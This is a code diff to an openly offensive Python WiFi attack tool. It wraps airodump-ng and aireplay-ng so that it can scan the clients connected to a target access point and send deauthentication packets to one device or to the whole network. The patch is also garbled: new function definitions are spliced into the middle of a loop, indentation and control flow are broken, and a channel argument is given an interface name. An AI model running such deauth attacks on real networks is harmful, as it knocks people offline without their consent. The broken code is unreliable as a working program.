@@ -74,16 +74,36 @@ def main():
     check_wifi_adapter()
     start_monitor_mode()
     scan_networks()
+def scan_connected_devices(target_mac):
+    print (f"[*] Scanning devices connected to {target_mac}... Press Ctrl+C to stop.")
+    subprocess.run(["sudo", "airodump-ng", "--bssid", target_mac, "-c", "wlan0mon"])
+
+
+
     
     while True:
         target_mac = select_target_network()
-        packet_count = select_deauth_packet_count()
-        start_deauth_attack(target_mac, packet_count)
+def select_target_device(target_mac):
+    print("[?] Do you want to target a specific SSID? (yes/no): ")
+    choice = input().strip().lower()
 
-        repeat = input("[?] Would you like to perform another attack? (yes/no): ").strip().lower()
-        if repeat != "yes":
-            print("[+] Thank you for using the tool. Exiting...")
-            sys.exit()
+    if choice == "yes":
+        scan_connected_devices(target_mac)
+        client_mac = input("[?] Enter the target device MAC address: ").strip()
+        return client_mac
+    else:
+        return None  # Direkt modem hedef alınacak
+       
+       
+        packet_count = select_deauth_packet_count()
+def start_deauth_attack(target_mac, client_mac, packet_count):
+    if client_mac:
+        print(f"[*] Starting deauthentication attack on {client_mac} in {target_mac} network...")
+        subprocess.run(["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-c", client_mac, "-i", "wlan0mon", "--ignore-negative-one"])
+    else:
+        print(f"[*] Starting deauthentication attack on the entire {target_mac} network...")
+        subprocess.run(["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-i", "wlan0mon", "--ignore-negative-one"])
+
 
 if __name__ == "__main__":
     main()
